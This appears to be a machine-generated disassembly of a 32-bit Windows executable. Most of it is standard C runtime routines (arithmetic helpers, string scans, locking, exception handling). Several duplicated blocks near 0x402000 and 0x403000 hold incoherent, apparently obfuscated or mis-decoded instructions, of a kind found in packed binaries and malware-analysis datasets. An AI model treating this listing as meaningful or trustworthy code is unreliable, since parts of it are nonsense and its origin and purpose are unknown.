mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_41d330
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_41d370
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_41d3c0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov edx eax
xor eax eax
and cl 0x1f
shl edx cl
retn
shld edx eax cl
shl eax cl
retn
sub_41d3e0
cmp [ rw-data ] 0x0
je r-xdata
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_41d4a0
push ebp
mov ebp esp
push edi
cmp [ rw-data ] 0x1
jb r-xdata
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov edi [ ebp + 0x8 ]
ja r-xdata
mov eax edi
xor eax eax
jmp r-xdata
movzx edx [ ebp + 0xc ]
test edx edx
je r-xdata
movzx edx [ ebp + 0xc ]
mov eax edx
shl edx 0x8
or edx eax
movd xmm3 edx
pshuflw xmm3 xmm3 0x0
movlhps xmm3 xmm3
mov ecx 0xf
and ecx edi
or eax 0xffffffff
shl eax cl
sub edi ecx
xor edx edx
cld
pop edi
leave
retn
mov eax 0xfffffff0
and eax edi
pxor xmm0 xmm0
pcmpeqb xmm0 [ eax ]
mov ecx 0xf
and ecx edi
mov edx 0xffffffff
shl edx cl
pmovmskb edi xmm0
and edi edx
jne r-xdata
xor eax eax
test edi 0xf
je r-xdata
push ebx
pmovmskb ebx xmm1
and ebx eax
shl ecx 0x1
xor eax eax
sub eax ecx
and ecx eax
dec ecx
and ecx ebx
pop ebx
bsr eax ecx
add eax edi
test ecx ecx
cmove eax edx
pop edi
leave
retn
pmovmskb ecx xmm1
and ecx eax
bsr eax ecx
add eax edi
test ecx ecx
cmovne edx eax
or eax 0xffffffff
add edi 0x10
jmp r-xdata
bsf edx edi
add eax edx
jmp r-xdata
pxor xmm0 xmm0
pcmpeqb xmm0 [ eax + 0x10 ]
add eax 0x10
pmovmskb edi xmm0
test edi edi
je r-xdata
movd xmm0 edx
movzx ecx [ edi ]
cmp ecx edx
cmove eax edi
test ecx ecx
je r-xdata
movdqu xmm1 [ edi ]
pxor xmm2 xmm2
pcmpeqb xmm2 xmm1
pcmpeqb xmm1 xmm3
pmovmskb ecx xmm2
and ecx eax
jne r-xdata
pop edi
leave
retn
add edi 0x10
pcmpistri xmm0 [ edi - 0x10 ] 0x40
lea ecx [ edi + ecx - 0x10 ]
cmovb eax ecx
jne r-xdata
inc edi
test edi 0xf
jne r-xdata
sub_41d5e0
cmp [ rw-data ] 0x1
jb r-xdata
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
movzx eax [ esp + 0x8 ]
mov edx eax
shl eax 0x8
or edx eax
movd xmm3 edx
pshuflw xmm3 xmm3 0x0
movlhps xmm3 xmm3
mov edx [ esp + 0x4 ]
mov ecx 0xf
or eax 0xffffffff
and ecx edx
shl eax cl
sub edx ecx
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
bsf eax ecx
add eax edx
movd edx xmm3
xor ecx ecx
cmp dl [ eax ]
cmovne eax ecx
retn
or eax 0xffffffff
add edx 0x10
jmp r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
movdqu xmm1 [ edx ]
pxor xmm2 xmm2
pcmpeqb xmm2 xmm1
pcmpeqb xmm1 xmm3
por xmm2 xmm1
pmovmskb ecx xmm2
and ecx eax
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_401260
push esi
mov esi ecx
push 0x7dc
push 0x0
lea eax [ esi + 0x4 ]
mov [ esi ] 0x0
push eax
call sub_40be70
add esp 0xc
mov eax esi
pop esi
retn
sub_401280
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
push [ ecx ]
mov [ rw-data ] 0x1
push [ ebp + 0x8 ]
call sub_4012b0
mov eax 0x1
pop ebp
retn 0xc
sub_401470
mov [ ecx + 0x108 ] 0x1
mov eax ecx
mov [ ecx + 0x10c ] 0x1
retn
sub_401580
mov eax rw-data
retn
sub_401a1f
push ebx
push esp
push eax
push esp
push edx
call sub_401b2b
jae 0xffffffffccc32987
add [ eax ] al
add [ ecx - 0x7edb8a1d ] al
iretd
sub_402099
add esp 0x80
retn
sub_4022f3
push ebp
pushfd
push edi
pushfd
call sub_4022d0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
sub_402350
ja r-xdata
pop eax
pop edx
add esp 0x4
jae r-xdata
xor edx 0xd1e8509c
sub esp 0x18
call sub_402221
add edx 0x79810f59
add eax 0xff0e830f
sub_4024c4
push ebx
sub esp 0x14
call sub_4024d2
mov ecx 0xc281e579
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_4024e5
jmp [ 0x70246c83 ]
jl 0xffffffffebc12c5a
sub_4024d2
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_4024e5
jmp [ 0x70246c83 ]
jl 0xffffffffebc12c5a
sub_40250e
push ebp
push edx
push edi
push ebx
call sub_40251d
jne 0xffffffffa3a50b90
sub_402541
jmp [ esp + 0xa8 ]
sub_402595
jmp [ esp + 0x2c ]
sub_40274c
add esp 0x68
retn
sub_4029bb
push ebx
push esp
push eax
push esp
push edx
call sub_402ac7
jae 0xffffffffccc33923
add [ eax ] al
add [ ecx - 0x7edb8a1d ] al
iretd
sub_403035
add esp 0x80
retn
sub_40328f
push ebp
pushfd
push edi
pushfd
call sub_40326c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
sub_4032ec
ja r-xdata
pop eax
pop edx
add esp 0x4
jae r-xdata
xor edx 0xd1e8509c
sub esp 0x18
call sub_4031bd
add edx 0x79810f59
add eax 0xff0e830f
sub_403382
push ebx
sub esp 0x14
call sub_403390
mov ecx 0xc281e579
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_4033a3
jmp [ 0x70246c83 ]
jl 0xffffffffebc13b18
sub_403390
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_4033a3
jmp [ 0x70246c83 ]
jl 0xffffffffebc13b18
sub_4033cc
push ebp
push edx
push edi
push ebx
call sub_4033db
jne 0xffffffffa3a51a4e
sub_4033ff
jmp [ esp + 0xa8 ]
sub_403453
jmp [ esp + 0x2c ]
sub_40361a
add esp 0x68
retn
sub_4036a0
push ebp
mov ebp esp
pop ebp
jmp sub_40bfcd
sub_4036e0
mov eax ecx
retn
sub_407536
push es
push es
pop es
or [ eax ] cl
or [ ecx ] ecx
or cl [ edx ]
or ecx [ ebx ]
or al 0xc
or eax 0xd0d0d0d
int3
sub_409e82
push es
push es
pop es
or [ eax ] cl
or [ ecx ] ecx
or cl [ edx ]
or ecx [ ebx ]
or al 0xc
or eax 0xd0d0d0d
int3
sub_40a894
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call j_sub_411e2d
pop ecx
pop ebp
retn
sub_40a8a2
push ebp
mov ebp esp
pop ebp
jmp sub_40a861
sub_40aad5
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
push ecx
push eax
call sub_410ef5
pop ecx
pop ecx
retn
_start
call sub_40afd8
jmp sub_40a9a2
sub_40ab43
and [ ecx + 0x4 ] 0x0
mov eax ecx
and [ ecx + 0x8 ] 0x0
mov [ ecx + 0x4 ] r--data
mov [ ecx ] r--data
retn
sub_40ab7c
and [ ecx + 0x4 ] 0x0
mov eax ecx
and [ ecx + 0x8 ] 0x0
mov [ ecx + 0x4 ] r--data
mov [ ecx ] r--data
retn
sub_40abc0
lea eax [ ecx + 0x4 ]
mov [ ecx ] r--data
push eax
call sub_40c5ed
pop ecx
retn
sub_40abfe
push ebp
mov ebp esp
sub esp 0xc
lea ecx [ ebp - 0xc ]
call sub_40ab43
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_40c60c
int3
sub_40ac1b
push ebp
mov ebp esp
sub esp 0xc
lea ecx [ ebp - 0xc ]
call sub_40ab7c
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_40c60c
int3
j_sub_411e2d
jmp j_sub_411e2d#2
sub_40ac4a
push ebp
mov ebp esp
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push [ ebp + 0x8 ]
call [ UnhandledExceptionFilter@IAT ]
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop ebp
retn
sub_40af1e
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_40af43
push ebp
mov ebp esp
call sub_40b50f
test eax eax
je r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
mov ecx rw-data
xchg [ ecx ] eax
sub_40afc3
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40af88
neg eax
pop ecx
sbb eax eax
neg eax
dec eax
pop ebp
retn
sub_40b074
xor eax eax
inc eax
retn
sub_40b078
mov eax 0x4000
retn
sub_40b07e
xor eax eax
retn
sub_40b081
push rw-data
call [ InitializeSListHead@IAT ]
retn
sub_40b08d
push 0x30000
push 0x10000
push 0x0
call sub_411d38
add esp 0xc
test eax eax
jne r-xdata
push 0x7
call sub_40b0e9
int3
retn
sub_40b0ae
mov eax rw-data
retn
sub_40b0b4
call sub_401580
mov ecx [ eax + 0x4 ]
or [ eax ] 0x4
mov [ eax + 0x4 ] ecx
call sub_40b0ae
mov ecx [ eax + 0x4 ]
or [ eax ] 0x2
mov [ eax + 0x4 ] ecx
retn
sub_40b0d1
xor eax eax
cmp [ rw-data ] eax
sete al
retn
sub_40b0dd
mov eax rw-data
retn
sub_40b0e3
mov eax rw-data
retn
sub_40b237
push sub_40b243
call [ SetUnhandledExceptionFilter@IAT ]
retn
j_sub_40c250
jmp [ r--data ]
sub_40b336
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx

sub_40b50f
xor eax eax
cmp [ rw-data ] eax
setne al
retn
sub_40c250
retn
sub_40c3c3
xor eax eax
push eax
push eax
push eax
push rw-data
call sub_401000
add esp 0x10
retn
sub_40c3d6
push rw-data
call sub_401088
pop ecx
retn
sub_40c708
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn 0x4
cmp eax rw-data
je r-xdata
push eax
call sub_411e2d
pop ecx
sub_40c7dd
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov al 0x1
retn
push eax
call sub_40d82d
or [ rw-data ] 0xffffffff
pop ecx
sub_40c8ac
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_40c8b5
mov esp [ ebp - 0x18 ]
call sub_411d97
sub_40c901
and [ ecx + 0x4 ] 0x0
mov eax ecx
and [ ecx + 0x8 ] 0x0
mov [ ecx + 0x4 ] r--data
mov [ ecx ] r--data
retn
sub_40c9a3
push [ ebp - 0x14 ]
call sub_40cb8a
pop ecx
retn
sub_40cad5
push 0x4
mov eax sub_41d7ca
call sub_41d111
call sub_40c724
cmp [ eax + 0x1c ] 0x0
jne r-xdata
call sub_411d97
and [ ebp - 0x4 ] 0x0
call sub_40dca7
sub_40d1d9
xor eax eax
inc eax
retn
sub_40d1dd
mov esp [ ebp - 0x18 ]
call sub_411d97
sub_40d304
xor eax eax
inc eax
retn
sub_40d3d3
push [ ebp - 0x14 ]
call sub_40d318
pop ecx
retn
sub_40d411
call sub_40c724
cmp [ eax + 0x18 ] 0x0
jle r-xdata
retn
call sub_40c724
dec [ eax + 0x18 ]
sub_40da95
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_40dc85
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_40dac7
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_40d980
add esp 0xc
pop ebp
retn 0x8
sub_40db49
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_40dc59
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_40db90
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_40dca4
call eax
retn
sub_40dca7
push esi
call sub_40c724
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
call sub_411d97
mov ecx esi
call j_sub_40c250
call esi
sub_40e263
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] 0xe06d7363
sete al
pop ebp
retn
sub_40e375
mov esp [ ebp - 0x18 ]
call sub_411d97
sub_40e380
push 0x2
call sub_4129ea
pop ecx
retn
sub_40e47e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40e48d
push 0x1
push 0x2
push 0x0
call sub_40e276
add esp 0xc
retn
sub_40e49c
push 0x1
push 0x0
push 0x0
call sub_40e276
add esp 0xc
retn
sub_40e4ab
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x2
push [ ebp + 0x8 ]
call sub_40e276
add esp 0xc
pop ebp
retn
sub_40e4f9
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_40e276
add esp 0xc
pop ebp
retn
sub_40e50f
call sub_41320e
imul ecx [ eax + 0x18 ] 0x343fd
add ecx 0x269ec3
mov [ eax + 0x18 ] ecx
shr ecx 0x10
and ecx 0x7fff
mov eax ecx
retn
sub_40e654
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_40e668
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_40e768
push [ ebp - 0x20 ]
call sub_40e668
pop ecx
retn
sub_40e7b7
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_40e668
pop ecx
retn
sub_40ee87
mov edi edi
push esi
mov esi ecx
push [ esi + 0x404 ]
call sub_411e2d
and [ esi + 0x404 ] 0x0
pop ecx
pop esi
retn
sub_40f41e
call sub_40f45c
test al al
jne r-xdata
mov al 0x1
retn
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
xor al al
retn
sub_40f43d
call sub_40f486
test al al
jne r-xdata
mov al 0x1
retn
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
xor al al
retn
sub_40f486
lea edx [ ecx + 0x18 ]
mov [ ecx + 0x3c ] 0x1
push edx
movzx edx [ ecx + 0x32 ]
add ecx 0x448
push edx
call sub_41064f
mov al 0x1
retn
sub_4103ef
mov edx [ ecx + 0x20 ]
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x0
push 0x8
call sub_410231
retn
or edx 0x80
mov [ ecx + 0x20 ] edx
sub_41040e
push 0x1
push 0x10
mov [ ecx + 0x28 ] 0x8
mov [ ecx + 0x2c ] 0xa
call sub_410231
retn
sub_41054d
mov eax [ ecx ]
test eax eax
jne r-xdata
push eax
call sub_410590
pop ecx
retn
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
xor al al
retn
sub_41056e
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ ecx + 0x1c ] 0x7
je r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
xor al al
retn
sub_410990
mov edx r--data
jmp sub_415b77
sub_41099a
mov edx r--data
jmp sub_415af0
sub_410e40
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_417cd5
pop ebp
retn
sub_410ee1
push 0x0
call sub_4129ea
pop ecx
retn
sub_410eea
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_411e67
sub_411068
mov eax [ rw-data ]
retn
sub_41106e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41107d
mov eax [ rw-data ]
mov ecx eax
xor eax [ rw-data ]
and ecx 0x1f
ror eax cl
neg eax
sbb eax eax
neg eax
retn
sub_411096
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_417cd5
pop ebp
retn
sub_4110f3
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40e244
pop ecx
mov [ rw-data ] eax
pop ebp
retn
sub_4113f6
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_411108
sub_41159a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
pop ebp
retn
push eax
call sub_41152b
pop ecx
sub_4115b5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
pop ebp
retn
push eax
call sub_41152b
pop ecx
j_sub_411401
jmp sub_411401
sub_41173d
xor eax eax
mov ecx rw-data
inc eax
xchg [ ecx ] eax
retn
sub_411791
push 0x4
call sub_4129ea
pop ecx
retn
sub_4117fc
mov eax [ rw-data ]
retn
sub_411831
mov eax rw-data
retn
j_sub_411e2d#2
jmp sub_411e2d
sub_411881
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4129ea
pop ecx
retn
sub_4118d2
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4129ea
pop ecx
retn
sub_411b8f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push rw-data
call sub_411bff
pop ecx
pop ecx
pop ebp
retn
sub_411c23
push rw-data
mov ecx rw-data
call sub_417cd5
mov al 0x1
retn
sub_411c35
push rw-data
call sub_411bc2
mov [ esp ] rw-data
call sub_411bc2
pop ecx
mov al 0x1
retn
sub_411c4f
call sub_4115d0
mov al 0x1
retn
sub_411c94
push 0x0
call sub_40c6a8
pop ecx
retn
sub_411d14
push r--data
push r--data
call sub_417b41
pop ecx
pop ecx
retn
sub_411d26
push r--data
push r--data
call sub_417bc4
pop ecx
pop ecx
retn
sub_411dbf
xor eax eax
inc eax
retn
sub_4128e9
cmp [ ecx ] 0x0
jne r-xdata
mov al 0x1
retn
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
xor al al
retn
sub_4129a2
mov edi edi
push ebp
mov ebp esp
imul eax [ ebp + 0x8 ] 0x18
add eax rw-data
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_4129ea
mov edi edi
push ebp
mov ebp esp
imul eax [ ebp + 0x8 ] 0x18
add eax rw-data
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_412ee0
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4129ea
pop ecx
retn
sub_412f41
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4129ea
pop ecx
retn
sub_412f8c
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4129ea
pop ecx
retn
sub_412fd4
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4129ea
pop ecx
retn
sub_413343
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov al 0x1
retn
push eax
call sub_412b6e
or [ rw-data ] 0xffffffff
sub_413498
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_417cd5
pop ebp
retn
sub_41368d
push 0x8
call sub_4129ea
pop ecx
retn
sub_413743
push 0x1
call sub_41374c
pop ecx
retn
sub_4137f1
push [ ebp - 0x28 ]
call sub_40e668
pop ecx
retn
sub_41381b
push 0x8
call sub_4129ea
pop ecx
retn
sub_413a1b
push 0x7
call sub_4129ea
pop ecx
retn
sub_413b01
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_417215
pop ecx
retn
sub_4142c8
push esi
call sub_417215
pop ecx
retn
sub_4146da
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4144fd
sub_41499f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x100
push [ ebp + 0x8 ]
call sub_414838
add esp 0xc
pop ebp
retn
sub_414b56
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_414a5c
add esp 0x10
pop ebp
retn
sub_414c91
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_414b70
add esp 0x14
pop ebp
retn
sub_415a24
mov ecx [ rw-data ]
xor eax eax
or ecx 0x1
cmp [ rw-data ] ecx
sete al
retn
sub_415a40
call sub_415a7c
xchg cl ch
jmp r-xdata
fpatan
or cl cl
je r-xdata
or ch ch
je r-xdata
fldpi
fsubrp st1
retn
fchs
sub_415aac
fstp st0
fld [ r--data ]
retn
sub_415ad8
fstp st0
mov cl ch
jmp r-xdata
call sub_415aac
jmp sub_41a8ed
sub_415bb8
and [ ebp - 0x2c8 ] 0xfe
sub_415e0f
lea edx [ esp + 0x4 ]
call sub_41ac05
sub_415f3f
lea edx [ esp + 0x4 ]
call sub_41ac05
sub_4161f0
sub esp 0xc
fst [ esp ]
call sub_41ac48
call sub_41620d
add esp 0xc
retn
sub_416204
lea edx [ esp + 0x4 ]
call sub_41ac05
sub_41674d
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4162c2
sub_41678f
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4129ea
pop ecx
retn
sub_416c32
cmp [ rw-data ] 0x0
jne r-xdata
mov al 0x1
retn
push 0x1
push 0xfffffffd
call sub_416b31
pop ecx
pop ecx
mov [ rw-data ] 0x1
sub_416ce1
push 0x5
call sub_4129ea
pop ecx
retn
sub_416fbd
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_416f64
add esp 0x10
pop ebp
retn
sub_416fd5
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call [ GetCommandLineW@IAT ]
mov [ rw-data ] eax
mov al 0x1
retn
sub_416fee
mov al 0x1
retn
sub_4171e9
push 0x7
call sub_4129ea
pop ecx
retn
sub_417a4d
push 0x4
call sub_4129ea
pop ecx
retn
sub_417aae
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_417ab9
sub_417b26
call [ GetProcessHeap@IAT ]
test eax eax
mov [ rw-data ] eax
setne al
retn
sub_417b37
and [ rw-data ] 0x0
mov al 0x1
retn
sub_417c5f
mov ecx [ ebp + 0x10 ]
push [ ecx ]
call sub_4129ea
pop ecx
retn
sub_417f49
cmp [ ebp - 0x1d ] 0x0
je r-xdata
retn
push 0x3
call sub_4129ea
pop ecx
sub_41875a
mov ecx [ ebp + 0x10 ]
push [ ecx ]
call sub_417215
pop ecx
retn
sub_4189a6
push edi
call sub_417215
pop ecx
retn
sub_418a51
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4188ce
add esp 0x10
pop ebp
retn
sub_418a6c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4189d3
add esp 0x10
pop ebp
retn
sub_41a7f8
fxch st1
fstp st0
retn
sub_41a806
fstp st0
fldz
retn
sub_41a80b
fstp st0
fstp st0
fldz
test ch ch
je r-xdata
retn
fchs
sub_41a818
fstp st0
fstp st0
fld1
retn
sub_41a81f
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x0
fadd [ r--data ]
retn
mov [ ebp - 0x90 ] 0x0
retn
sub_41a84a
fxch st1
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x0
mov [ ebp - 0x90 ] 0x0
jmp r-xdata
faddp st1
retn
sub_41a8b3
fstp st0
fstp st0
fld [ r--data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
mov [ ebp - 0x90 ] 0x1
sub_41a8d0
fstp st0
fstp st0
fld [ r--data ]
or ch ch
je r-xdata
or cl cl
je r-xdata
fchs
retn
fld [ r--data ]
fmulp st1
sub_41a8ed
or cl cl
je r-xdata
retn
fchs
sub_41a9ff
push 0xa
call IsProcessorFeaturePresent
mov [ rw-data ] eax
xor eax eax
retn
sub_41aa10
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff0
fstp [ esp ]
movq xmm0 [ esp ]
call sub_41aa2e
leave
retn
sub_41aa28
movlpd xmm0 [ esp + 0x4 ]
sub_41abc0
fld st0
frndint
fsubr st1
fxch st1
fchs
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_41abd5
mov edx [ esp + 0x4 ]
and edx 0x300
or edx 0x7f
mov [ esp + 0x6 ] dx
fldcw [ esp + 0x6 ]
retn
sub_41abec
test eax 0x80000
je r-xdata
fadd [ r--data ]
mov eax 0x0
retn
mov eax 0x0
retn
sub_41ac48
mov eax [ esp + 0x8 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ esp + 0x8 ]
retn
retn
sub_41adb0
push ebp
mov ebp esp
